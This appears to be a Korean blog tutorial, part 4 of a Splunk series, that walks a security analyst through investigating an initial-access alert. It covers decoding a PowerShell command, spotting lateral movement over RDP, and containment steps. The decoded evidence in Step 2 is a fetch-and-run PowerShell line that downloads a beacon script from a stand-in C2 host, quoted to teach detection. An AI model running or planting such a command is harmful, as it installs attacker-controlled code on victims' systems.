---
layout: post
title:  "Splunk 중급편 Part 4: 경보 조사 및 침해 분석 워크플로우"
date:   2025-07-08 14:30:00 +0900
categories: jekyll update
---

## 시작하며: 경보, 그 다음은 무엇인가?

지난 파트에서 우리는 정교한 탐지 룰을 만들어 자동화된 경보를 설정했습니다. 이제 우리의 Splunk는 24시간 내내 시스템을 감시하며 이상 징후가 발생할 때마다 알려주는 든든한 파수꾼이 되었습니다. 하지만 파수꾼이 소리를 쳤을 때, 그것이 진짜 늑대인지 아니면 그냥 지나가는 개였는지 판단하고 대응하는 것은 결국 분석가의 몫입니다.

이번 파트에서는 **보안 분석가의 관점**에서, 발생한 경보를 어떻게 조사하고 분석하여 실제 위협 여부를 판단하는지에 대한 실전 워크플로우를 다룹니다. 단순히 로그를 검색하는 것을 넘어, 흩어진 단서들을 꿰어 맞추며 공격의 전체 스토리를 재구성하는 '디지털 탐정'의 여정을 함께 따라가 보겠습니다.

## 시나리오: "초기 침투" 경보 발생!

어느 날 아침, 당신은 다음과 같은 제목의 경보 이메일을 받았습니다.

> **[Splunk Alert] High-Priority: 초기 침투 의심 행위 탐지 (WEB_SERVER_01)**

지난 파트에서 우리가 만들었던 "시나리오 1: 브라우저 다운로드와 의심스러운 자식 프로세스" 경보가 발생한 것입니다. 이제부터 당신의 임무는 이 경보가 실제 공격인지, 아니면 관리자의 정상적인 작업으로 인한 오탐인지 판단하고, 만약 실제 공격이라면 피해 범위를 파악하는 것입니다.

## 분석 워크플로우: 4단계 드릴다운(Drill-down) 분석

### Step 1: 경보 내용 확인 및 초기 평가 (Triage)

가장 먼저 할 일은 경보에 포함된 핵심 정보를 빠르게 훑어보는 것입니다.

*   **언제?** `_time` = `2025-07-08 10:05:15`
*   **어디서?** `host` = `WEB_SERVER_01`
*   **누가?** `user` = `jdoe`
*   **무엇을?** `downloaded_file` = `C:\Users\jdoe\Downloads\Urgent_Invoice.zip`, `process_name` = `powershell.exe`
*   **어떻게?** `CommandLine` = `powershell -enc JABjAGwA... (Base64 인코딩된 문자열)`

**초기 판단:**
사용자 `jdoe`가 `Urgent_Invoice.zip` 파일을 다운로드한 직후, 난독화된 PowerShell 명령이 실행되었다. 파일 이름과 난독화된 명령어 모두 악성 행위일 가능성이 매우 높아 보입니다. **따라서 이 경보는 '실제 위협(True Positive)'일 가능성이 높다고 판단하고, 즉시 심층 분석에 착수합니다.**

### Step 2: 공격의 시작점 추적 (Initial Access)

이제 공격의 시작점인 PowerShell 명령의 실체를 파악해야 합니다. Base64로 인코딩된 `CommandLine`을 복호화하여 어떤 명령이 실행되었는지 확인합니다.

```spl
// 1. 해당 이벤트의 CommandLine 필드만 추출
index=win_sysmon_logs host="WEB_SERVER_01" user="jdoe" process_name="powershell.exe" _time="2025-07-08 10:05:15"
| head 1
| table CommandLine

// 2. (Splunk 외부에서) Base64 복호화 수행
// 결과: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil-c2-server.com/beacon.ps1')"
```

**분석 결과:**
PowerShell은 `evil-c2-server.com` 라는 외부 서버로부터 `beacon.ps1` 스크립트를 다운로드하여 메모리에서 바로 실행(`IEX`)했습니다. 이는 전형적인 C2(Command & Control) 서버 통신을 위한 악성 비컨(Beacon) 설치 행위입니다.

### Step 3: 수평 이동 및 내부 확산 확인 (Lateral Movement)

공격자가 C2 서버와 연결되었으니, 이제 이 서버를 거점으로 다른 시스템으로 확산을 시도했을 가능성이 높습니다. 우리는 `WEB_SERVER_01`에서 발생한 모든 네트워크 연결(Sysmon EventCode 3)을 조사하여 추가적인 악성 통신이 있었는지 확인해야 합니다.

```spl
// WEB_SERVER_01에서 발생한 모든 외부 네트워크 연결을 확인
`sysmon` host="WEB_SERVER_01" EventCode=3

// 1. 내부 IP 대역을 제외하여 외부로의 연결만 필터링
| where NOT (dest_ip IN ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"))

// 2. 어떤 프로세스가, 어떤 외부 IP와 통신했는지 통계 확인
| stats count by process_name, dest_ip, dest_port
```

**분석 결과:**
`powershell.exe`가 `evil-c2-server.com` (IP: `45.55.12.34`)의 80번 포트와 통신한 기록 외에도, `mstsc.exe` (원격 데스크톱 클라이언트) 프로세스가 내부망의 다른 서버(`DB_SERVER_05`)로 접속을 시도한 흔적(`dest_ip=10.1.1.50, dest_port=3389`)이 발견되었습니다. 공격자가 `WEB_SERVER_01`을 발판 삼아 내부 DB 서버로의 수평 이동을 시도했음을 의미합니다.

### Step 4: 피해 범위 식별 및 대응 (Impact Assessment & Response)

지금까지의 분석을 통해 우리는 다음 사실들을 확인했습니다.

*   **최초 침해 시스템:** `WEB_SERVER_01`
*   **최초 침해 사용자:** `jdoe`
*   **악성 C2 서버:** `evil-c2-server.com` (`45.55.12.34`)
*   **추가 확산 시도:** `DB_SERVER_05`

이제 이 정보를 바탕으로 즉각적인 대응 조치를 취해야 합니다.

1.  **네트워크 차단:** 방화벽에서 C2 서버 IP(`45.55.12.34`)와의 모든 통신을 차단합니다.
2.  **호스트 격리:** EDR 솔루션을 통해 `WEB_SERVER_01`을 네트워크에서 즉시 격리하여 추가 확산을 막습니다.
3.  **계정 비활성화:** 사용자 `jdoe`의 계정 비밀번호를 변경하고, 모든 세션을 강제 종료합니다.
4.  **전사적 피해 조사:** Splunk에서 `evil-c2-server.com` 또는 `45.55.12.34` IP와 통신한 다른 시스템이 있는지 전사 로그를 대상으로 검색하여 추가 피해 시스템이 있는지 확인합니다.

## 다음 이야기

이번 파트에서는 하나의 경보에서 시작하여, 드릴다운 분석을 통해 공격의 전체 스토리를 재구성하고, 구체적인 대응 조치까지 연결하는 실전 워크플로우를 경험했습니다. 이처럼 Splunk는 단순한 검색 툴을 넘어, 보안 분석가의 사고 과정을 지원하고 위협에 신속하게 대응할 수 있도록 돕는 강력한 플랫폼입니다.

하지만 만약 이 모든 대응 과정의 일부를 자동화할 수 있다면 어떨까요? 다음 마지막 파트에서는 **"대응 자동화의 첫걸음: SOAR 연동 및 다음 단계"**를 주제로, 분석가의 개입을 최소화하고 위협에 더욱 신속하게 대응하는 SOAR의 개념과 Splunk와의 연동 방안에 대해 알아보겠습니다.

---
